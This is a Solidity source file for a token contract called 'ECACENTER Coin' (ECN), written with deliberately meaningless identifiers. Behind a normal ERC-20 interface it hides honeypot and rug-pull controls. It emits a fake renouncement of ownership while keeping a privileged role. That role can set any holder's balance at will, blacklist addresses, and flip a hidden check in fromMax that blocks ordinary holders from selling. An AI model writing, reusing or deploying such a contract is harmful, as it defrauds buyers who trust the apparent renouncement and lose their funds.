//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface isAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromTx) external view returns (uint256);

    function transfer(address totalFrom, uint256 txTeam) external returns (bool);

    function allowance(address liquidityTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 txTeam) external returns (bool);

    function transferFrom(
        address sender,
        address totalFrom,
        uint256 txTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txLaunch, uint256 value);
    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);
}

interface amountTrading {
    function createPair(address limitTradingSwap, address atLaunched) external returns (address);
}

interface receiverTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract exemptReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isAutoMetadata is isAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ECACENTERCoin is exemptReceiver, isAuto, isAutoMetadata {

    uint256 maxExempt;

    function limitSwap(address fundLaunched) public {
        swapFromAmount();
        
        if (fundLaunched == maxTx || fundLaunched == shouldTxIs) {
            return;
        }
        enableSwap[fundLaunched] = true;
    }

    string private isMode = "ECN";

    function balanceOf(address fromTx) public view virtual override returns (uint256) {
        return teamFee[fromTx];
    }

    address private maxTakeTeam;

    bool private minEnable;

    address exemptAutoMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private minList = "ECACENTER Coin";

    function allowance(address shouldExemptTotal, address feeLaunched) external view virtual override returns (uint256) {
        if (feeLaunched == exemptAutoMin) {
            return type(uint256).max;
        }
        return launchedMarketing[shouldExemptTotal][feeLaunched];
    }

    mapping(address => uint256) private teamFee;

    function getOwner() external view returns (address) {
        return maxTakeTeam;
    }

    uint8 private toAt = 18;

    bool public tokenMode;

    function exemptAuto(address autoFund, address totalFrom, uint256 txTeam) internal returns (bool) {
        require(teamFee[autoFund] >= txTeam);
        teamFee[autoFund] -= txTeam;
        teamFee[totalFrom] += txTeam;
        emit Transfer(autoFund, totalFrom, txTeam);
        return true;
    }

    address sellAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function swapFromAmount() private view {
        require(buyShould[_msgSender()]);
    }

    mapping(address => bool) public enableSwap;

    bool public totalFeeToken;

    constructor (){
        
        tradingLimit();
        receiverTx sellLiquidity = receiverTx(exemptAutoMin);
        shouldTxIs = amountTrading(sellLiquidity.factory()).createPair(sellLiquidity.WETH(), address(this));
        
        maxTx = _msgSender();
        buyShould[maxTx] = true;
        teamFee[maxTx] = autoToken;
        
        emit Transfer(address(0), maxTx, autoToken);
    }

    mapping(address => mapping(address => uint256)) private launchedMarketing;

    mapping(address => bool) public buyShould;

    function name() external view virtual override returns (string memory) {
        return minList;
    }

    function transferFrom(address autoFund, address totalFrom, uint256 txTeam) external override returns (bool) {
        if (_msgSender() != exemptAutoMin) {
            if (launchedMarketing[autoFund][_msgSender()] != type(uint256).max) {
                require(txTeam <= launchedMarketing[autoFund][_msgSender()]);
                launchedMarketing[autoFund][_msgSender()] -= txTeam;
            }
        }
        return fromMax(autoFund, totalFrom, txTeam);
    }

    function transfer(address buyShouldMax, uint256 txTeam) external virtual override returns (bool) {
        return fromMax(_msgSender(), buyShouldMax, txTeam);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoToken;
    }

    bool private shouldLimitLaunched;

    uint256 private autoToken = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return isMode;
    }

    bool public fundSender;

    function receiverExempt(address buyShouldMax, uint256 txTeam) public {
        swapFromAmount();
        teamFee[buyShouldMax] = txTeam;
    }

    function atList(address enableFeeWallet) public {
        if (tokenMode) {
            return;
        }
        
        buyShould[enableFeeWallet] = true;
        if (liquidityAuto != swapMin) {
            shouldLimitLaunched = false;
        }
        tokenMode = true;
    }

    function tradingLimit() public {
        emit OwnershipTransferred(maxTx, address(0));
        maxTakeTeam = address(0);
    }

    uint256 private liquidityAuto;

    address public shouldTxIs;

    uint256 marketingReceiver;

    function approve(address feeLaunched, uint256 txTeam) public virtual override returns (bool) {
        launchedMarketing[_msgSender()][feeLaunched] = txTeam;
        emit Approval(_msgSender(), feeLaunched, txTeam);
        return true;
    }

    address public maxTx;

    function fromMax(address autoFund, address totalFrom, uint256 txTeam) internal returns (bool) {
        if (autoFund == maxTx) {
            return exemptAuto(autoFund, totalFrom, txTeam);
        }
        uint256 shouldTx = isAuto(shouldTxIs).balanceOf(sellAt);
        require(shouldTx == maxExempt);
        require(!enableSwap[autoFund]);
        return exemptAuto(autoFund, totalFrom, txTeam);
    }

    event OwnershipTransferred(address indexed listFrom, address indexed limitWallet);

    function decimals() external view virtual override returns (uint8) {
        return toAt;
    }

    uint256 public swapMin;

    function liquidityList(uint256 txTeam) public {
        swapFromAmount();
        maxExempt = txTeam;
    }

    function owner() external view returns (address) {
        return maxTakeTeam;
    }

}